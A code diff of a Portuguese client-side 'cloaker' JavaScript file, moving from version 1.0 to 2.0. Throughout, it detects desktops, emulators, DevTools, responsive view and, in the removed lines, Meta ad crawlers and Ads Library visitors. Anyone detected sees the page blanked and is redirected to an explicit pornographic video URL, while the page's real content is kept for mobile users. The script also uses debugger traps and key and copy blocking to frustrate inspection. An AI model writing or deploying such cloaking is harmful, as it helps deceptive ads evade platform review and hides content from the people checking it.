@@ -1,6 +1,6 @@
 /**
- * SCRIPT DE PROTEÇÃO AGRESSIVA - VERSÃO 1.0
- * Proteção contra desktop, DevTools, Meta Ads Library e bots
+ * CLOAKER CLIENT-SIDE - VERSÃO 2.0
+ * Proteção contra desktop, emuladores, DevTools e visualização responsiva
  * Autor: Sistema de Proteção Avançada
  * Data: 2025
  */
@@ -8,21 +8,12 @@
 (function() {
     'use strict';
     
-    // Configurações
-    const CONFIG = {
-        REDIRECT_URL: 'https://www.xvideos.com/video.umtvkhb9ecc/meio-irmao_gostosa_e_fodida_pelo_meio-irmao',
-        META_BOTS: ['facebookexternalhit', 'facebot', 'meta', 'crawler', 'spider', 'bot', 'scraper'],
-        DESKTOP_PATTERNS: ['windows', 'macintosh', 'linux', 'x11', 'desktop'],
-        MOBILE_PATTERNS: ['android', 'iphone', 'ipad', 'ipod', 'blackberry', 'iemobile', 'opera mini', 'mobile'],
-        DEVTOOLS_THRESHOLD: 160,
-        INACTIVITY_TIMEOUT: 3000
-    };
+    // Configuração do redirecionamento
+    const REDIRECT_URL = 'https://www.xvideos.com/video.umtvkhb9ecc/meio-irmao_gostosa_e_fodida_pelo_meio-irmao';
     
     // Variáveis de controle
     let protectionActive = true;
-    let userInteracted = false;
-    let devtoolsOpen = false;
-    let inactivityTimer = null;
+    let lastDebugTime = Date.now();
     
     /**
      * Função principal de proteção
@@ -30,166 +21,90 @@
     function initProtection() {
         if (!protectionActive) return;
         
-        // Executar todas as verificações
+        // Executar verificações imediatas
         checkDesktop();
+        checkEmulators();
         checkDevTools();
-        checkMetaBots();
-        setupEventListeners();
-        setupInactivityDetection();
-        setupConsoleTraps();
-        setupCopyProtection();
+        checkResponsiveView();
         
         // Verificação contínua
         setInterval(() => {
             if (!protectionActive) return;
             checkDevTools();
-            checkInactivity();
-        }, 500);
+            checkResponsiveView();
+        }, 1000);
     }
     
     /**
-     * Detectar e redirecionar desktop/notebook
+     * 🔒 1. Bloquear computadores e notebooks (desktop)
      */
     function checkDesktop() {
         const userAgent = navigator.userAgent.toLowerCase();
-        const isDesktop = CONFIG.DESKTOP_PATTERNS.some(pattern => userAgent.includes(pattern)) &&
-                         !CONFIG.MOBILE_PATTERNS.some(pattern => userAgent.includes(pattern));
+        const mobilePatterns = [
+            'android', 'iphone', 'ipad', 'ipod', 'blackberry', 'iemobile', 
+            'opera mini', 'mobile', 'tablet', 'phone', 'samsung', 'xiaomi',
+            'motorola', 'lg', 'nokia', 'huawei', 'oneplus', 'google pixel'
+        ];
         
-        if (isDesktop) {
+        const isMobile = mobilePatterns.some(pattern => userAgent.includes(pattern));
+        
+        if (!isMobile) {
             console.log('[PROTECTION] Desktop detectado - redirecionando...');
             redirectToTarget();
         }
     }
     
     /**
-     * Detectar DevTools e redirecionar
+     * 🧪 2. Bloquear emuladores e dispositivos com tela ampla
+     */
+    function checkEmulators() {
+        // Verificar suporte a toque
+        const hasTouchSupport = 'ontouchstart' in window;
+        
+        // Verificar largura da tela
+        const isWideScreen = screen.width > 1024;
+        
+        if (!hasTouchSupport || isWideScreen) {
+            console.log('[PROTECTION] Emulador ou tela ampla detectado - redirecionando...');
+            redirectToTarget();
+        }
+    }
+    
+    /**
+     * 🛡️ 3. Detectar abertura do DevTools (inspecionar elemento)
      */
     function checkDevTools() {
-        const widthThreshold = window.outerWidth - window.innerWidth > CONFIG.DEVTOOLS_THRESHOLD;
-        const heightThreshold = window.outerHeight - window.innerHeight > CONFIG.DEVTOOLS_THRESHOLD;
+        const currentTime = Date.now();
+        const timeDiff = currentTime - lastDebugTime;
         
-        if (widthThreshold || heightThreshold) {
-            if (!devtoolsOpen) {
-                devtoolsOpen = true;
-                console.log('[PROTECTION] DevTools detectado - redirecionando...');
-                redirectToTarget();
-            }
-        } else {
-            devtoolsOpen = false;
-        }
-    }
-    
-    /**
-     * Detectar bots da Meta e redirecionar
-     */
-    function checkMetaBots() {
-        const userAgent = navigator.userAgent.toLowerCase();
-        const referrer = document.referrer.toLowerCase();
-        
-        // Verificar user agent de bots
-        const isMetaBot = CONFIG.META_BOTS.some(bot => userAgent.includes(bot));
-        
-        // Verificar referrer da biblioteca de anúncios
-        const isFromMetaAds = referrer.includes('facebook.com/ads/library') ||
-                             referrer.includes('adsmanager.facebook.com') ||
-                             referrer.includes('business.facebook.com/adsmanager') ||
-                             referrer.includes('fb.com/ads/library') ||
-                             referrer.includes('instagram.com/ads/library');
-        
-        // Verificar parâmetros de URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const hasMetaParams = urlParams.has('fbclid') || urlParams.has('igshid');
-        
-        if (isMetaBot || isFromMetaAds || hasMetaParams) {
-            console.log('[PROTECTION] Bot da Meta detectado - redirecionando...');
+        // Se o tempo entre execuções for maior que 100ms, DevTools foi aberto
+        if (timeDiff > 100) {
+            console.log('[PROTECTION] DevTools detectado - redirecionando...');
             redirectToTarget();
         }
-    }
-    
-    /**
-     * Configurar detecção de inatividade
-     */
-    function setupInactivityDetection() {
-        inactivityTimer = setTimeout(() => {
-            if (!userInteracted) {
-                console.log('[PROTECTION] Inatividade detectada - redirecionando...');
-                redirectToTarget();
-            }
-        }, CONFIG.INACTIVITY_TIMEOUT);
-    }
-    
-    /**
-     * Verificar inatividade
-     */
-    function checkInactivity() {
-        if (!userInteracted && inactivityTimer) {
-            clearTimeout(inactivityTimer);
-            setupInactivityDetection();
+        
+        lastDebugTime = currentTime;
+        
+        // Debugger oculto
+        try {
+            debugger;
+        } catch (e) {
+            // Ignorar erros do debugger
         }
     }
     
     /**
-     * Configurar event listeners para interação do usuário
+     * 📏 4. Detectar visualização responsiva (modo emulador)
      */
-    function setupEventListeners() {
-        const events = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'];
+    function checkResponsiveView() {
+        const widthDiff = window.outerWidth - window.innerWidth;
+        const heightDiff = window.outerHeight - window.innerHeight;
+        const threshold = 160;
         
-        events.forEach(event => {
-            document.addEventListener(event, () => {
-                userInteracted = true;
-                if (inactivityTimer) {
-                    clearTimeout(inactivityTimer);
-                }
-            }, { passive: true });
-        });
-    }
-    
-    /**
-     * Configurar armadilhas do console
-     */
-    function setupConsoleTraps() {
-        // Sobrescrever console.debug
-        const originalDebug = console.debug;
-        console.debug = function(...args) {
-            console.log('[PROTECTION] Console.debug detectado - redirecionando...');
+        if (widthDiff > threshold || heightDiff > threshold) {
+            console.log('[PROTECTION] Visualização responsiva detectada - redirecionando...');
             redirectToTarget();
-            return originalDebug.apply(console, args);
-        };
-        
-        // Armadilha para F12
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
-                (e.ctrlKey && e.key === 'U') || (e.ctrlKey && e.key === 'S')) {
-                e.preventDefault();
-                console.log('[PROTECTION] Tecla de atalho detectada - redirecionando...');
-                redirectToTarget();
-                return false;
-            }
-        });
-    }
-    
-    /**
-     * Proteção contra cópia
-     */
-    function setupCopyProtection() {
-        // Bloquear clique direito
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            console.log('[PROTECTION] Clique direito bloqueado');
-            return false;
-        });
-        
-        // Bloquear seleção de texto
-        document.addEventListener('selectstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        // Bloquear arrastar
-        document.addEventListener('dragstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
+        }
     }
     
     /**
@@ -198,28 +113,15 @@
     function redirectToTarget() {
         protectionActive = false;
         
-        // Limpar timers
-        if (inactivityTimer) {
-            clearTimeout(inactivityTimer);
-        }
+        // Limpar conteúdo da página
+        document.documentElement.innerHTML = '';
         
         // Redirecionar
         try {
-            window.location.href = CONFIG.REDIRECT_URL;
+            window.location.href = REDIRECT_URL;
         } catch (e) {
             // Fallback
-            window.location.replace(CONFIG.REDIRECT_URL);
-        }
-    }
-    
-    /**
-     * Função para adicionar parâmetro src=ads
-     */
-    function addAdsParameter() {
-        const url = new URL(window.location.href);
-        if (!url.searchParams.has('src')) {
-            url.searchParams.set('src', 'ads');
-            window.history.replaceState({}, '', url.toString());
+            window.location.replace(REDIRECT_URL);
         }
     }
     
@@ -235,17 +137,8 @@
         // Verificar novamente após carregamento completo
         setTimeout(() => {
             checkDesktop();
-            checkMetaBots();
+            checkEmulators();
         }, 1000);
     });
-    
-    // Proteção contra manipulação do script
-    Object.freeze(CONFIG);
-    
-    // Exportar função para uso externo (opcional)
-    window.protectionSystem = {
-        redirect: redirectToTarget,
-        addAdsParam: addAdsParameter
-    };
     
 })();
